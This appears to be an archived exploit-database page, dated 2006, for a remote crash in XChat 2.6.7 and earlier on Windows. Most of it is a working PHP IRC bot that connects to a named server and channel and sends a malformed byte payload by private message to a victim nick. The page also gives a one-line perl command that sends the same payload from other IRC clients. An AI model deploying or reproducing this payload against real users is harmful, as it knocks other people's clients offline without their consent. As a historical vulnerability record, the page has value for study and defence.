<html><head><title>XChat <= 2.6.7 (win version) Remote Denial of Service Exploit (php)</title></head><pre>&lt;?
 # another way to test this with irssi/bitchx &lt;below&gt; /str0ke
 # /exec -o perl -e 'print &quot;\x9x\xF0\x92\x8D\x85\xF1\xA5\x90\xB4\xF1\x96\x9E\x85\xF1\xA6\x8D\xA5\xF1\xB8\xA5\x85\xF1\xA7\x95\xA8\x29\xF2\x95\x95\x82&quot;'
 ?&gt;

&lt;?php
// XChat &lt;= 2.6.7 Windows Remote Crash DoS by ratboy
// Tested on Windows SP1/SP2          
// The following bug was tested on the XChat &lt;= 2.6.7 on Windows SP1/SP2  

//Stop the script timing out
set_time_limit(0);

//Set constants
define(&quot;SERVER&quot;, 'irc.enigmagroup.org');
define(&quot;PORT&quot;, 6667);
define(&quot;CHANNEL&quot;, &quot;#enigmagroup&quot;);  //Set the channel the bot will join here
define(&quot;NICK&quot;, &quot;ratbot&quot;);    //Set the bot's nick here
define(&quot;EXPLOIT&quot;, &quot;\x9x\xF0\x92\x8D\x85\xF1\xA5\x90\xB4\xF1\x96\x9E\x85\xF1\xA6\x8D\xA5\xF1\xB8\xA5\x85\xF1\xA7\x95\xA8\x29\xF2\x95\x95\x82&quot;);
define(&quot;VICTIM&quot;, &quot;ratboy&quot;);

$socket = socket_create(AF_INET,SOCK_STREAM,SOL_TCP); // Create the Socket
$fp = socket_connect($socket, SERVER, PORT); // Connect to the server
socket_write($socket,&quot;USER ratboy ratboy ratboy :ratboy\r\n&quot;); // Send the Username to the server
socket_write($socket,&quot;NICK &quot;.NICK.&quot; \r\n&quot;); // Change our nickname
socket_write($socket,&quot;JOIN &quot;.CHANNEL.&quot; \r\n&quot;); // Join the channel
while($data = @socket_read($socket,2046)) { //read the data
    echo $data;
    $cmd = explode(&quot; &quot;, $data);

    if (strpos($data, &quot;PING :&quot;)===0) {
        socket_write($socket, &quot;PONG :&quot;.substr($data, 6).&quot;\r\n&quot;);
        continue;
    }
    
    if($cmd[1] == &quot;PRIVMSG&quot;){  // Send the exploit right when the channel gets a message then stop the bot
        socket_write($socket, &quot;PRIVMSG &quot;.VICTIM.&quot; :&quot;.EXPLOIT.&quot;\r\n&quot;);
        socket_close($socket);
    }
}

?&gt; 

# milw0rm.com [2006-08-07]</pre></html>